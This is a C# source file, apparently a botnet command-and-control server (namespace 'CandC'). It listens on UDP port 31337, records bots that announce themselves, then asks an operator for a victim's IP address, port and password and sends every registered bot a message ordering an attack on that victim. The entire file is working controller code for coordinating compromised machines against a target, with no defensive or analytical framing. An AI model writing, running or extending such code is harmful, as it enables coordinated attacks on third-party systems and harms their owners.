using System;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Threading;
using System.Text;

namespace CandC
{
    class Program
    {
        private static List<string> botnet;
        private static Socket botComm;

        private static void init()
        {
            botnet = new List<string>();
            botComm = new Socket(SocketType.Dgram, ProtocolType.Udp);
        }

        private static void listenToUser()
        {
            Console.WriteLine("Please enter IP:");
            string victimIP = Console.ReadLine();
            Console.WriteLine("Please enter port:");
            string victimPort = Console.ReadLine();
            Console.WriteLine("Please enter password:");
            string victimPassword = Console.ReadLine();
            Console.WriteLine("attacking victim on IP " + victimIP + ", port " + victimPort + " with " + botnet.Count + " bots");
            foreach (string bot in botnet)
            {
                string botIP = bot.Split(new string[] { ":" }, StringSplitOptions.None)[0];
                string botPort = bot.Split(new string[] { ":" }, StringSplitOptions.None)[1];
                string botActivate = "Destinationo IP = " + botIP + "\nTransport protocol = UDP\nDestination port = " + botPort + "\nMessage contents: " + victimIP + "," + victimPort + "," + victimPassword + ",nnn";
                byte[] botActivateMessage = Encoding.ASCII.GetBytes(botActivate);
                IPEndPoint botDest = new IPEndPoint(IPAddress.Parse(botIP), Int32.Parse(botPort));
                botComm.SendTo(botActivateMessage, botDest);
            }
        }

        private static void saveBots()
        {
            IPAddress[] localIPs= Dns.GetHostAddresses(Dns.GetHostName());
            IPAddress myIP = null;
            foreach (IPAddress addr in localIPs)
            {
                if (addr.AddressFamily == AddressFamily.InterNetwork)
                {
                    myIP = addr;
                }
            }
            IPEndPoint ip = new IPEndPoint(myIP, 31337);
            botComm.Bind(ip);
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
            byte[] botAnnouncement = new byte[1024];
            EndPoint remote = sender;
            while (true)
            {
                botAnnouncement = new byte[1024];
                botComm.ReceiveFrom(botAnnouncement, ref remote);
                string botMessage = Encoding.ASCII.GetString(botAnnouncement);
                string[] temp = botMessage.Split(new string[] { "Message contents: " }, StringSplitOptions.None);
                string listeningPort = temp[1].Split(new string[] { "\0" },StringSplitOptions.None)[0];
                string ipBot = ((IPEndPoint)remote).Address.ToString().Split(new string[] { "f:" }, StringSplitOptions.None)[1];
                if(!botnet.Contains(ipBot+":"+listeningPort))
                    botnet.Add(ipBot+":"+listeningPort);
            }
        }

        static void Main(string[] args)
        {
            init();
            Thread getBots = new Thread(new ThreadStart(saveBots));
            getBots.Start();
            while (true)
                listenToUser();

        }
    }
}
